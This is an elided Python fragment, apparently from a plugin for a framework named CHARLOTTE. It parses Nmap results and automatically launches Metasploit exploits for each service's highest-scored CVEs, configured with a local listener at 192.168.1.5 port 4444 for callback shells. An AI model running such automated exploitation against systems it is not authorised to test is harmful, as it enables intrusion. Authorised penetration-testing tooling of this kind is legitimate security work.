...
try:
    from utils.load_nmap_results import (
        load_nmap_results,
    )  # CHARLOTTE's Nmap parser helper
    ...
    print(
        "[!] Ensure you are running this plugin from within the CHARLOTTE framework directory."
    )
    sys.exit(1)
        ...
        for svc in services:
            ...
            for cve_id, score in sorted_cves:
                ...
                result = metasploit_plugin.execute_chained_cve(
                    client, cve_id=cve_id, rhost=rhost, lhost=lhost, lport=lport
                )
...
if __name__ == "__main__":
    ...
    if client:
        analyze_services_and_exploit(
            client, nmap_path=nmap_file, lhost="192.168.1.5", lport="4444"
        )
    else:
